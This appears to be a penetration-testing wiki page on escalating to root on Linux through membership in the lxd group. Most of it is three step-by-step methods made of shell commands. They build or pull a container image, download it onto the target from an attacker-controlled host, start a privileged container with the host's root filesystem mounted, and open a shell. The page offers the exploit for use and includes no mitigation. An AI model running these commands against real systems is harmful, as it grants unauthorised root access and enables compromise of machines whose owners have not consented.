# Lxd

## Theory

A member of the local `lxd` group can instantly **escalate the privileges to root** on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the `LXD` snap package.

LXD is a root process that carries out actions for anyone with write access to the `LXD` UNIX socket. It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.

## Practice

{% tabs %}
{% tab title="Exploit - 1" %}
We can build an Alpine image using [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder) and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.

On the host, build an image as follow&#x20;

```bash
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpines
```

Then, we can upload to the vulnerable server the **tar.gz** file

```bash
#On attacking machine
sudo python -m http.server 80

#On vulnerable server
wget http://<ATTACKING_IP>/apline-v3.10-x86_64-20191008_1227.tar.gz
```

On the vulnerable server, import the new image

```bash
# It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
lxc image import ./alpine*.tar.gz --alias myimage
lxc image list #List images
```

Now we can create the container

```bash
lxd init
lxc init myimage mycontainer -c security.privileged=true
# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

Execute the container

```bash
lxc start mycontainer
lxc exec mycontainer /bin/sh
```
{% endtab %}

{% tab title="Exploit - 2" %}
**On the attacking machine**, we can install [distrobuilder](https://github.com/lxc/distrobuilder) and build an image as follow

```bash
#Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
git clone https://github.com/lxc/distrobuilder
#Make distrobuilder
cd distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
```

Then, we can upload to the vulnerable server the files **lxd.tar.xz** and **rootfs.squashfs**

```bash
#On attacking machine
sudo python -m http.server 80

#On vulnerable server
wget http://<ATTACKING_IP>/lxd.tar.xz
wget http://<ATTACKING_IP>/rootfs.squashfs
```

On the vulnerable server, import the new image

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```

Create a container and add root path

```bash
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

{% hint style="danger" %}
If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
Run **`lxd init`** and **repeat** the previous chunk of commands
{% endhint %}

Execute the container

```bash
lxc start privesc
lxc exec privesc /bin/sh
$ cd /mnt/root #Here is where the filesystem is mounted
```
{% endtab %}

{% tab title="Exploit - With Internet" %}
If your target has an internet access, we can do as follow

```bash
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
lxc start test
lxc exec test bash
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation" %}

{% embed url="https://www.hackingarticles.in/lxd-privilege-escalation/" %}
